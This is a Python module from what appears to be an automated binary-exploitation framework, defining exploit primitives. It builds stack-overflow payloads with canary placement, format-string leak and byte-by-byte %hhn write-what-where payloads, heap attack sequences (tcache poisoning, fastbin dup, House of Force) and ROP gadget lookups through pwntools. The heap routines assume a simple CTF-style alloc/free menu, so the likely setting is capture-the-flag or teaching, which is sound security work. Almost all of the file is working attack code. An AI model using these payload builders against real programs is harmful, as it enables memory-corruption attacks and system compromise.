"""
Exploit primitives for building exploits.
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from autopwn.core.binary import Binary
from autopwn.core.context import ExploitContext
from autopwn.utils.helpers import p64, p32, flat
from autopwn.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class WriteWhat:
    """Write primitive: what to write."""
    value: int
    size: int = 8  # bytes


@dataclass
class WriteWhere:
    """Write primitive: where to write."""
    address: int
    offset: int = 0  # offset from address


@dataclass
class ReadPrimitive:
    """Arbitrary read primitive."""
    address: int
    size: int = 8


@dataclass
class LeakPrimitive:
    """Information leak primitive."""
    address: int
    leak_type: str = "address"  # address, canary, libc
    format_string: bool = False
    format_offset: int = 0


class ExploitPrimitive:
    """
    Base class for exploit primitives.

    Provides building blocks for exploit construction:
    - Write-what-where
    - Arbitrary read
    - Information leak
    - Control flow hijack
    """

    def __init__(self, context: ExploitContext):
        """
        Initialize primitive.

        Args:
            context: Exploitation context
        """
        self.context = context
        self.binary = context.binary

    def write_what_where(
        self,
        what: int,
        where: int,
        size: int = 8,
    ) -> bytes:
        """
        Build write-what-where payload.

        Args:
            what: Value to write
            where: Address to write to
            size: Size of write in bytes

        Returns:
            Payload bytes
        """
        # This depends on the specific primitive available
        # Format string, heap overwrite, etc.
        raise NotImplementedError("Subclasses must implement")

    def arbitrary_read(
        self,
        address: int,
        size: int = 8,
    ) -> bytes:
        """
        Build arbitrary read payload.

        Args:
            address: Address to read from
            size: Bytes to read

        Returns:
            Payload bytes
        """
        raise NotImplementedError("Subclasses must implement")

    def leak_address(
        self,
        target: str = "libc",
    ) -> bytes:
        """
        Build payload to leak address.

        Args:
            target: What to leak (libc, stack, binary)

        Returns:
            Payload bytes
        """
        raise NotImplementedError("Subclasses must implement")


class StackPrimitive(ExploitPrimitive):
    """
    Stack-based exploit primitives.
    """

    def __init__(self, context: ExploitContext, offset: int):
        """
        Initialize stack primitive.

        Args:
            context: Exploitation context
            offset: Offset to return address
        """
        super().__init__(context)
        self.offset = offset

    def build_overflow(
        self,
        rop_chain: bytes,
        canary: Optional[int] = None,
    ) -> bytes:
        """
        Build stack overflow payload.

        Args:
            rop_chain: ROP chain bytes
            canary: Stack canary value if needed

        Returns:
            Payload bytes
        """
        bits = self.binary.bits if self.binary else 64
        pack = p64 if bits == 64 else p32
        word_size = 8 if bits == 64 else 4

        payload = b"A" * self.offset

        if canary is not None:
            # Insert canary and saved frame pointer
            payload = b"A" * (self.offset - word_size * 2)
            payload += pack(canary)
            payload += b"B" * word_size  # saved rbp/ebp

        payload += rop_chain
        return payload

    def find_offset_pattern(self, crash_value: int) -> int:
        """
        Find offset using cyclic pattern.

        Args:
            crash_value: Value from crash (e.g., RIP)

        Returns:
            Offset
        """
        from autopwn.utils.helpers import cyclic_find
        return cyclic_find(crash_value)


class FormatStringPrimitive(ExploitPrimitive):
    """
    Format string exploit primitives.
    """

    def __init__(self, context: ExploitContext, offset: int):
        """
        Initialize format string primitive.

        Args:
            context: Exploitation context
            offset: Format string argument offset
        """
        super().__init__(context)
        self.offset = offset

    def leak_stack(self, num_words: int = 20) -> bytes:
        """
        Build payload to leak stack values.

        Args:
            num_words: Number of words to leak

        Returns:
            Payload bytes
        """
        payload = b""
        for i in range(num_words):
            payload += f"%{self.offset + i}$p.".encode()
        return payload + b"\n"

    def leak_address_at_offset(self, target_offset: int) -> bytes:
        """
        Leak address at specific offset.

        Args:
            target_offset: Stack offset to leak

        Returns:
            Payload bytes
        """
        return f"%{target_offset}$p\n".encode()

    def write_byte(
        self,
        address: int,
        value: int,
    ) -> bytes:
        """
        Write single byte using %hhn.

        Args:
            address: Target address
            value: Byte value (0-255)

        Returns:
            Payload bytes
        """
        bits = self.binary.bits if self.binary else 64
        addr_bytes = address.to_bytes(bits // 8, 'little')

        payload = addr_bytes
        if value > len(addr_bytes):
            payload += f"%{value - len(addr_bytes)}c".encode()
        payload += f"%{self.offset}$hhn".encode()

        return payload

    def write_what_where(
        self,
        what: int,
        where: int,
        size: int = 8,
    ) -> bytes:
        """
        Build write-what-where using format string.

        Args:
            what: Value to write
            where: Address to write to
            size: Size in bytes

        Returns:
            Payload bytes
        """
        bits = self.binary.bits if self.binary else 64
        word_size = bits // 8

        payload = b""
        written = 0

        for i in range(size):
            byte_addr = where + i
            byte_val = (what >> (i * 8)) & 0xFF

            addr_bytes = byte_addr.to_bytes(word_size, 'little')
            payload += addr_bytes

        # Add format specifiers
        current_offset = self.offset
        for i in range(size):
            byte_val = (what >> (i * 8)) & 0xFF

            if byte_val > written:
                padding = byte_val - written
            else:
                padding = (256 + byte_val - written) % 256

            if padding > 0:
                payload += f"%{padding}c".encode()
            payload += f"%{current_offset + i}$hhn".encode()
            written = byte_val

        return payload + b"\n"


class HeapPrimitive(ExploitPrimitive):
    """
    Heap-based exploit primitives.
    """

    def __init__(self, context: ExploitContext):
        """Initialize heap primitive."""
        super().__init__(context)
        self._allocations: List[Tuple[int, int]] = []

    def tcache_poison(
        self,
        target_addr: int,
        chunk_size: int = 0x20,
    ) -> List[bytes]:
        """
        Build tcache poisoning payloads.

        Args:
            target_addr: Address to get allocated
            chunk_size: Tcache bin size

        Returns:
            List of payloads in order
        """
        payloads = []

        # 1. Allocate two chunks of same size
        payloads.append(f"alloc {chunk_size}".encode())
        payloads.append(f"alloc {chunk_size}".encode())

        # 2. Free both (double-free or UAF)
        payloads.append(b"free 0")
        payloads.append(b"free 1")

        # 3. Overwrite fd pointer
        bits = self.binary.bits if self.binary else 64
        pack = p64 if bits == 64 else p32
        payloads.append(pack(target_addr))

        # 4. Allocate twice to get target
        payloads.append(f"alloc {chunk_size}".encode())
        payloads.append(f"alloc {chunk_size}".encode())  # This is at target_addr

        return payloads

    def fastbin_dup(
        self,
        target_addr: int,
        chunk_size: int = 0x20,
    ) -> List[bytes]:
        """
        Build fastbin dup payloads.

        Args:
            target_addr: Address to get allocated
            chunk_size: Fastbin size

        Returns:
            List of payloads
        """
        payloads = []

        # Classic fastbin dup: free(a), free(b), free(a)
        payloads.append(f"alloc {chunk_size}".encode())  # a
        payloads.append(f"alloc {chunk_size}".encode())  # b
        payloads.append(b"free 0")  # free a
        payloads.append(b"free 1")  # free b
        payloads.append(b"free 0")  # free a again (dup)

        # Now: a -> b -> a in fastbin
        # Allocate to overwrite a's fd
        bits = self.binary.bits if self.binary else 64
        pack = p64 if bits == 64 else p32
        payloads.append(pack(target_addr))

        # Allocate through to get target
        payloads.append(f"alloc {chunk_size}".encode())
        payloads.append(f"alloc {chunk_size}".encode())
        payloads.append(f"alloc {chunk_size}".encode())  # At target

        return payloads

    def house_of_force(
        self,
        target_addr: int,
        top_chunk_addr: int,
        heap_base: int,
    ) -> List[bytes]:
        """
        Build House of Force payloads.

        Args:
            target_addr: Target address
            top_chunk_addr: Address of top chunk
            heap_base: Heap base address

        Returns:
            List of payloads
        """
        payloads = []
        bits = self.binary.bits if self.binary else 64

        # 1. Overwrite top chunk size with -1
        if bits == 64:
            payloads.append(b"A" * 24 + p64(0xFFFFFFFFFFFFFFFF))
        else:
            payloads.append(b"A" * 12 + p32(0xFFFFFFFF))

        # 2. Calculate malloc size to reach target
        # size = target - top_chunk - header_size
        header_size = 16 if bits == 64 else 8
        evil_size = target_addr - top_chunk_addr - header_size

        payloads.append(f"alloc {evil_size}".encode())

        # 3. Next allocation is at target
        payloads.append(b"alloc 0x100")

        return payloads


class GadgetPrimitive:
    """
    ROP gadget primitives.
    """

    def __init__(self, binary: Binary):
        """Initialize gadget primitive."""
        self.binary = binary
        self._gadgets: Dict[str, int] = {}

    def find_gadget(self, instructions: List[str]) -> Optional[int]:
        """
        Find gadget matching instructions.

        Args:
            instructions: Required instructions

        Returns:
            Gadget address or None
        """
        # Use pwntools or ropper for gadget finding
        try:
            from pwn import ROP, context
            context.binary = self.binary._elf
            rop = ROP(self.binary._elf)
            gadget = rop.find_gadget(instructions)
            if gadget:
                return gadget[0]
        except Exception:
            pass

        return None

    def pop_rdi(self) -> Optional[int]:
        """Find pop rdi; ret gadget."""
        return self.find_gadget(["pop rdi", "ret"])

    def pop_rsi(self) -> Optional[int]:
        """Find pop rsi; ret gadget."""
        return self.find_gadget(["pop rsi", "ret"])

    def pop_rdx(self) -> Optional[int]:
        """Find pop rdx; ret gadget."""
        return self.find_gadget(["pop rdx", "ret"])

    def ret(self) -> Optional[int]:
        """Find ret gadget."""
        return self.find_gadget(["ret"])

    def syscall(self) -> Optional[int]:
        """Find syscall; ret gadget."""
        return self.find_gadget(["syscall", "ret"]) or self.find_gadget(["syscall"])
